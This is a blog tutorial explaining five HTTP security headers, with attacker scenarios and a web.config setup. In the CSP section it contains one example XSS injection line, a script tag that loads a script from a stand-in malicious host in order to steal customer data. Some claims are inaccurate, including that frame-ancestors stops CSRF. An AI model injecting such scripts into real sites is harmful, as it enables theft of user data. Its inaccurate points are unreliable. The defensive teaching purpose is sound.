# Top-5 HTTP Security Headers

![Top-5 HTTP Security Headers KDPV](~/img/kdpv/security-headers.jpg)

Nowadays, security is important as never before. I've prepared a very small article about the Top-5 security headers in 2020 that will help your site keep your users in safety. Have a nice reading!

## Content-Security-Policy

One of the most important security header. It was created to prevent the usage of any resource from an untrusted source.

Let's go to the short example first:

Evil Bob found [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) vulnerability on Alice's site. He decides to inject the script into the web-page to steal some customer data. He put this script tag into her page

```html
<script src="https://my-evilt-site.org/very-evil-script.js"></script>
```

and waits for the results

Luckily, Alice knows about CSP header and already added it to the response : ```Content-Security-Policy: default-src 'self'```. Now, a browser already knows, that scripts (and images, and fonts, and styles) not from origin domains are forbidden to use and Bob's attack fails.

Within this header you can deny inline scripts and eval usage (goodbye inline XSS), specify a checksum for the scripts (goodbye substitution of the 3rd party scripts), allow specific domains for your images, fonts, and styles. It can restrict fetch requests, deny usage of your site inside an iframe (goodbye [CSRF](https://en.wikipedia.org/wiki/Cross-site_request_forgery)) and much more. CSP header is very flexible and can support almost all of your needs.

### Can I use Content-Security-Policy?

CSP header [supported](https://caniuse.com/#feat=mdn-http_headers_csp_content-security-policy) by almost all browsers including IE (but with a special name - X-Content-Security-Policy). Some of the directives may not be supported across different browsers but this will not ruin the header.

### Code Example

* Allow all remote resources from your domain: ```Content-Security-Policy: default-src 'self'```. No external API calls allowed!
* Allow all remote resource from your domain and external api calls: ```Content-Security-Policy: default-src 'self'; connect-src 'self' https://my-example-api.ua```. IFraming is allowed.
* Allow all remote resource from your domain, external api calls, disallow iframing your site: ```Content-Security-Policy: default-src 'self'; connect-src 'self' https://my-example-api.ua; frame-ancestors 'none';``` Not so strict as I wish.
* Disallow everything except whitelisted: ```Content-Security-Policy: default-src 'none'; img-src 'self'; font-src 'self'; connect-src 'self' https://my-example-api.ua; script-src 'self'; style-src 'self'; frame-ancestors 'none'``` Much better now but without [critical css](https://developer.mozilla.org/en-US/docs/Web/Performance/Critical_rendering_path)
* Disallow everything except whitelisted (with inline css): ```Content-Security-Policy: default-src 'none'; img-src 'self'; font-src 'self'; connect-src 'self' https://my-example-api.ua; script-src 'self'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'```

Examples are simplified just to give you a better understanding of the CSP header power. For additional info check the [mdn page](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) and the [CSP Cheat Sheet](https://scotthelme.co.uk/csp-cheat-sheet/) is also very useful.

**Important Notice**: If you need to deny the possibility to iframe your site in IE - you should use [X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)


## X-Content-Type-Options

This is a bit tricky header but it works very well with CSP, so it worth mentioning.

Imagine, that Evil Bob found XSS on Alice's site and tries to put some malicious script inside. But Alice already has setup CSP policy, so his attempt to download javascript from untrusted resources fails. But Evil Bob is smart. He changes the type of the injected script to "text/plain". Now, CSP protection will allow loading script, because it is not javascript anymore and should not be executed. But sometimes, browsers try to be too smart. They may check the content of the loading "text", and decide to execute it as JavaScript. This named sniffing and this behavior varies depending on the browser.

This header tells the browser,  strictly follow provided Mime/Type, and don't try to guess.

### Can I use X-Content-Type-Options?

[Supported](https://caniuse.com/#feat=mdn-http_headers_x-content-type-options) by all browsers except Safari.

### Code Example

Only one option is possible: ```X-Content-Type-Options: nosniff```

## Feature-Policy

This header is designed to turn off features that you don't expect to be used.

Alice has a nice and shiny site with a big audience. Evil Bob found XSS and decided to use Alice's site for spying using a user's web camera. So he injects malicious code and waits for the dozen of the new videos.

But, fortunately, Alice already set Feature-Policy header to ```Feature-Policy: camera 'none'```

Now, browsers know, that using a camera is not permitted for anyone, and Bob's attempt fails. Of course, you can turn off not only a camera but also autoplay (useful when you are showing some ads from 3rd party vendors), microphone and very much more. If you don't want to turn it off for all, you can allow to use it only for code from your domain.


### Can I use Feature-Policy?

Partially [supported](https://caniuse.com/#feat=feature-policy) by most of the browsers and not supported by the IE.

### Code Example

Disabling geolocation:  ```Feature-Policy: geolocation 'none'```
Disabling sensetive features:  ```Feature-Policy: camera 'none'; microphone 'none'; geolocation 'none'; autoplay 'none'; display-capture 'none'; payment 'none'```

## Strict-Transport-Security

This is a very simple header for those who use HTTPS. It tells the browser to use only HTTPS connection, even if the user is trying to use HTTP.

Let's imaging that Alice is sitting in a public place and use public WiFi. Evil Bob is sitting not very far from her and trying to sniff all non-encrypted traffic. Alice decides to visit some online-shop and uses an old and good link like www://my-example-shop.com. Evil Bob sees her request (it's not encrypted) and starts recording Alice's activity hoping to get credit card information. But, after the first request, the shop returns STS header: ```Strict-Transport-Security: max-age=31536000```. And browsers automatically redirects Alice to the HTTPS version of the page. From now, Evil Bob sees only encrypted traffic and can't steal anything.

## Can I use Strict-Transport-Security?

[Supported](https://caniuse.com/#feat=stricttransportsecurity) by all browsers except Opera Mini. And Yes, IE also supports this header.

### Code Example

```Strict-Transport-Security: max-age=31536000; includeSubDomains```

## Referrer-Policy

Controls how much of the referer information (host, query params, etc) are sent within the request.

Short example:

Alice has a forum about cats with lots of links to other resources. When a user clicks on the link, he is navigated to another web page, and this web page can gather some information about the source of the navigation. You value the privacy of your users and want to keep this information secret. You set Referer-Policy header and deny browser to send referer information for all except your self.

### Can I use Referrer-Policy?

Mostly [Supported](https://caniuse.com/#feat=referrer-policy) with all (IE - partially) browsers except Opera Mini

### Code Example

Showing referer info only for the origin: ```Referrer-Policy: same-origin```

## Summary:

As far as I use .NET, here is the result setup for web.config: (note, unsafe js inline is not supported):

```xml
<customHeaders>
    <add name="Content-Security-Policy" value="default-src 'none'; img-src 'self'; font-src 'self'; connect-src 'self' https://my-example-api.ua; script-src 'self'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'" />
    <add name="Feature-Policy" value="camera 'none'; microphone 'none'; geolocation 'none'; autoplay 'none'; display-capture 'none'; payment 'none'" />
    <add name="X-Content-Type-Options" value="nosniff"/>
    <add name="Referrer-Policy" value="same-origin"/>
    <add name="Strict-Transport-Security" value="max-age=31536000"/>
</customHeaders>
```

## Useful links:

* [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
* [CSP Cheat Sheet](https://scotthelme.co.uk/csp-cheat-sheet/)
* [Feature-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Feature_Policy)
* [Using Feature-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Feature_Policy/Using_Feature_Policy)
* [X-Content-Type-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/headers/X-Content-Type-Options)
* [Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)
* [Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)


Bonus: web.config with all set headers can be found [here](https://github.com/Drag13/articles/blob/master/headers/web.config)

**Stay safe and don't forget to remove x-powered header! :)**

[Thanks to John Salvino for the photo]
